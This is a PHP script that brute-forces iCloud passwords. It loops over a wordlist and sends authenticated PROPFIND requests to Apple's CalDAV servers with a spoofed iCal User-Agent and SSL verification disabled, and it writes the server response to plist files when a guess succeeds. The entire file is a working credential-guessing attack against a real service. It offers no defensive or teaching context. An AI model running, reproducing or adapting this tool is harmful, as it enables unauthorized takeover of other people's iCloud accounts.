<?php

$file_handle = fopen("files/wordlist.txt", "r");
$j=0;
while (!feof($file_handle)) { 
$j++;
$xml="<A:propfind xmlns:A='DAV:'>
								<A:prop>
									<A:current-user-principal/>
								</A:prop>
							</A:propfind>";
$line_of_text = fgets($file_handle); 
$password = rtrim($line_of_text);
  

//Define iCloud URLs
	$icloudUrls = array();
	for($i = 1; $i < 25; $i++)
		$icloudUrls[] = "https://p".str_pad($i, 2, '0', STR_PAD_LEFT)."-caldav.icloud.com";
	
	//Functions
	
	$set = false;
	$tableau = array(); 
	foreach($icloudUrls as $server) {	
		$tableau[] = $server; 
			}
	$url=$tableau[rand(1, 23)];
	
	
	
// function doRequest($user, $password, $url, $xml)
	// {
		//Init cURL
		$ch=curl_init($url);
		//Set headers
		curl_setopt($ch, CURLOPT_HTTPHEADER, array("Depth: 1", "Content-Type: text/xml; charset='UTF-8'", "User-Agent: DAVKit/4.0.1 (730); CalendarStore/4.0.1 (973); iCal/4.0.1 (1374); Mac OS X/10.6.2 (10C540)"));
		curl_setopt($ch, CURLOPT_HEADER, 0);
		//Set SSL
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		//Set HTTP Auth
		curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
		curl_setopt($ch, CURLOPT_USERPWD, $user.":".$password);
		//Set request and XML
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PROPFIND");
		curl_setopt($ch, CURLOPT_POSTFIELDS, $xml);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);


			$got = 0;
			$response=curl_exec($ch);


$pos = 0;
$pos = strpos($response, "OK");
	if($pos > 0) 
		{
			$got = 1;
			// return $password;
			echo '<font color="green"><b>Password Found!!</b><br>'.$password;
			echo'<br>--------------<br>';
			file_put_contents('./token.plist', $response);
			echo "<center>Saved to Disk...</center>";
			echo '<font color="green">Brutforce Done AT Line '.$j.'<br>';
			die( "Success! The password is: {$line_of_text}" );

	}
         
// $pos = 0;                              
// $pos = strpos($response, "disabled");

	// if($pos > 0)
		// {
			// $got = 1;
			// echo "password = ".$password.'<br>';
			// echo "<b>Account Blocked</b><br>";
			// exit(0);
		// }

$pos = 0;
$pos = strpos($response, "Unauthorized");

	if($pos > 0)
		{
			$got = 1;
			echo '<font color="red">password = '.$password.'<br>';
		}
 
	if($got == 0) 
		{
			// echo $response;
	//echo "<br><br>Headers Debugging Info:<br></br>";
	//echo curl_getinfo($ch, CURLINFO_HEADER_OUT);
		}

	if ( $error = curl_error($ch) )
	
		echo 'ERROR: ',$error;
		curl_close($ch); 


	if (strpos($response, "OK") !== false)
		{
			echo "<center>Generating Token....</center>";
			file_put_contents('./password.plist', $response);
			echo "<center>Saved to Disk...</center>";
			die( "Success! The password is: {$line_of_text}" );
	
		}
	else
	{
    echo "Password Incorrect Trying Next<br>";
	echo '<font color="red">Brutforce Failer AT Line '.$j.'<br>';
	
	}
	
echo '=======================================================<br>';
}
	
	
	
	
	
	
	
	


fclose($file_handle);
	
	

	
	
	




?>